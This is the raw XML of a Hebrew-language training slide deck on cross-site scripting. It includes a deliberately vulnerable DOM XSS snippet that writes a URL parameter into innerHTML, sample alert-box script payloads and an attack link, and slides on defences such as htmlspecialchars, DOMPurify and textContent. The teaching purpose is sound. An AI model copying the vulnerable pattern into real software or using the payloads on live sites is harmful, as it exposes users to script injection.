              <a:rPr lang="en-US" dirty="0"/>
              <a:t> = new </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>URLSearchParams</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>window.location.search</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>);</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>        var name = </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>urlParams.get</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>('name');</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>        </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>output.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:highlight>
                  <a:srgbClr val="FFFF00"/>
                </a:highlight>
              </a:rPr>
              <a:t>innerHTML</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> = "Hello, " + name;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>    &lt;/script&gt;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>&lt;/body&gt;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="8" algn="l"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>&lt;/html&gt;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="73485834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925595B-8124-412A-A309-F5B0AFB82FA9}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4740964" y="642594"/>
            <a:ext cx="6384235"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950B81D4-E0A0-4E1E-ACCB-CE4D007D4AF8}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1066800" y="2103120"/>
            <a:ext cx="10058400" cy="4317558"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit lnSpcReduction="10000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>הבעיה: בקוד הזה, אנחנו לוקחים ערך מה-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> URL </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>ומכניסים אותו ישירות לתוך ה-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>DOM </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> באמצעות </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>innerHTML</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> בלי שום קידוד או בדיקה. זה פותח את האפשרות להזרקת קוד זדוני.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>הסבר על הבעיה:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>שימוש  בפונקציה </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>innerHTML</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> מאפשרת להכניס </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> HTML</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>כולל סקריפטים ישירות לתוך אלמנט ב-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>DOM </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> כל קלט שמוזן ל-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>innerHTML</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> עשוי להתפרש כקוד </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>HTML </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> או </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> JavaScript </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>ולא כטקסט פשוט.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>דוגמה להתקפה:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>אם מישהו ישלח קישור כזה:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="fr-FR" dirty="0"/>
              <a:t>http://example.com/dom-xss.html?name=&lt;script&gt;alert('DOM XSS');&lt;/script&gt;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>הקוד הזדוני יוכנס ישירות לתוך ה-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>DOM </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> ויריץ את ההודעה:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Hello, &lt;script&gt;alert('DOM XSS');&lt;/script&gt;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>תוצאה:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>הודעת התראה תופיע עם הטקסט </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>DOM XSS</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> מה שמוכיח שהקוד הזדוני רץ בדפדפן.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="8504729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38D2224-FEE8-4B22-ACE8-E53C8E34ADC3}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4760842" y="642594"/>
            <a:ext cx="6364357"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EFDF3570-7D09-4790-BBE5-72CE1B3A89E8}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit fontScale="92500" lnSpcReduction="10000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" sz="3000" b="1" u="sng" dirty="0"/>
              <a:t>הגנה מפני </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="3000" b="1" u="sng" dirty="0"/>
              <a:t>XSS</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Stored XSS .1</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>קידוד פלט</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Output Encoding</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> השתמש בפונקציות שמבצעות קידוד של הפלט לפני הצגתו בדפדפן, כמו </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>htmlspecialchars</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> ב-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>PHP</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>בידוד קלט </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t> Input Sanitization</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>בדוק ונקה את הקלט לפני עיבודו.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Reflected XSS .2</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>קידוד פלט </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Output Encoding</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> קידוד הקלט מהמשתמש לפני החזרתו.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>שימוש בפרמטרים מסוננים</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>: בדוק וודא שהקלט תקין ולא מכיל קוד זדוני.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>DOM-Based XSS .3</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>שימוש ב-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0" err="1"/>
              <a:t>DOMPurify</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> כלי לניקוי קלט זדוני מ-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>DOM</a:t>
            </a:r>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>הימנעות מהכנסת קוד </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>HTML</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t> ישירות ל-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>DOM</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>: השתמש בפונקציות בטוחות לטיפול בקלט כמו </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>textContent</a:t>
            </a:r>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="39634117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B2C5CF0-4EF0-4C82-88C6-C1D06D7F6833}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4790661" y="235090"/>
            <a:ext cx="6334539"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1B7A32E8-A896-4D8C-98CE-634581110C56}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1066800" y="1461051"/>
            <a:ext cx="10058400" cy="4909931"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit lnSpcReduction="10000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" sz="2400" b="1" u="sng" dirty="0"/>
              <a:t>הגנה מפני</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" u="sng" dirty="0"/>
              <a:t>XSS </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" sz="2400" b="1" u="sng" dirty="0"/>
              <a:t> מאוחסן </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" u="sng" dirty="0"/>
              <a:t>Stored XSS</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" sz="2400" b="1" u="sng" dirty="0"/>
              <a:t>:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>1. קידוד פלט </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Output Encoding</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>יש להשתמש בפונקציות שמבצעות קידוד של הפלט לפני הצגתו בדפדפן. דוגמה לפונקציה כזו ב-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>PHP </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> היא </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>htmlspecialchars</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> שמבצעת המרה של תווים מיוחדים כמו &lt; &gt; &amp; ", לישויות </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>HTML</a:t>
            </a:r>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="fr-FR" dirty="0"/>
              <a:t>$comment = </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR" dirty="0" err="1"/>
              <a:t>htmlspecialchars</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR" dirty="0"/>
              <a:t>($_POST['comment'], ENT_QUOTES, 'UTF-8');</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="fr-FR" dirty="0" err="1"/>
              <a:t>echo</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR" dirty="0"/>
              <a:t> $comment;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>כאן הפונקציה </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR" dirty="0" err="1"/>
              <a:t>htmlspecialchars</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> משמשת להמרת תווים מיוחדים בקלט לישויות </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> HTML</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>כדי למנוע התקפות </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>XSS</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>לדוגמה:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>הקוד: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>&lt;script&gt;alert('XSS')&lt;/script&gt;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>אם נציג את הקלט הזה בלי קידוד, הדפדפן יפרש אותו כקוד</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>JavaScript </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> ויבצע אותו, מה שיגרום להתרעה </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>alert</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> להופיע על המסך. אבל אם נשתמש ב- </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR" dirty="0" err="1"/>
              <a:t>htmlspecialchars</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> הקלט יומר ל:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>&amp;</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>lt;script&amp;gt;alert</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>('XSS')&amp;</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>lt</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>;/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>script&amp;gt</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>;</a:t>
            </a:r>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>וכך הדפדפן יציג את הקלט הזה כטקסט רגיל במקום לבצע אותו כקוד.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="280579866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8CF661-875D-4CFE-A048-1D4B87D59944}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4770783" y="235089"/>
            <a:ext cx="6354417"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CC4250C2-3847-43E8-BCEF-AC7B787BDAEE}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1066800" y="1725959"/>
            <a:ext cx="10058400" cy="5251311"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" sz="2400" b="1" u="sng" dirty="0"/>
              <a:t>הגנה מפני</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" u="sng" dirty="0"/>
              <a:t>XSS </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" sz="2400" b="1" u="sng" dirty="0"/>
              <a:t> מאוחסן </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" u="sng" dirty="0"/>
              <a:t>Stored XSS</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" sz="2400" b="1" u="sng" dirty="0"/>
              <a:t>:</a:t>
            </a:r>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>2. בידוד קלט </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Input Sanitization</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>יש לבדוק ולנקות את הקלט לפני עיבודו ואחסונו במסד הנתונים. ניקוי קלט יכול לכלול הסרת תווים לא רצויים או הגבלת קלט לתבניות מסוימות.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>לדוגמה הקוד:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>$comment = </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>filter_input</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>(INPUT_POST, 'comment', FILTER_SANITIZE_STRING);</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0" err="1"/>
              <a:t>filter_input</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>()</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>: זו פונקציה מובנית ב-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>PHP </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> המשמשת לסינון ולוולידציה של </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0" err="1"/>
              <a:t>קלטים</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> שהתקבלו מהמשתמש. היא פועלת על המערכים הגלובליים כמו </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>GET, POST</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> וכו' הפונקציה מחזירה את הקלט המסונן או </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>FALSE</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> אם הקלט לא קיים או לא תקף.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>לדוגמה, אם נריץ את: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Hello &lt;script&gt;alert('XSS');&lt;/script&gt; World!</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>אזי נקבל את הפלט: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Hello alert('XSS'); World!</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>כלומר, התווים הזדוניים </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>/script</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>script</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> הוסרו.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="253654178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128E171-C302-45F3-9F09-ECB75D55CC04}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4731026" y="642594"/>
            <a:ext cx="6394174"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E8F607C8-6561-444C-BED4-C7C3164B6FD1}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" sz="2400" b="1" dirty="0"/>
              <a:t>הגנה מפני </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0"/>
              <a:t>XSS</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" sz="2400" b="1" dirty="0"/>
              <a:t> משתקף </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0"/>
              <a:t>Reflected XSS</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" sz="2400" b="1" dirty="0"/>
              <a:t>:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>קידוד פלט </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Output Encoding</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>קידוד הקלט מהמשתמש לפני החזרתו לדפדפן. כמו בדוגמה הקודמת, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
